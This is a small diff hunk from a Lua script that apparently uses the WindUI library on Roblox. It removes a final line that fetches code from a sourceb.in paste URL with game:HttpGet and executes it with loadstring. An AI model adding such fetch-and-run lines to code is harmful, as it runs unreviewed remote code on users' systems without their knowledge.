@@ -3036,5 +3036,3 @@ WindUI:Notify({
     Icon    = "ghost",
     Duration= 6,
 })
-
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/LglVMn8iNb/0", true))()
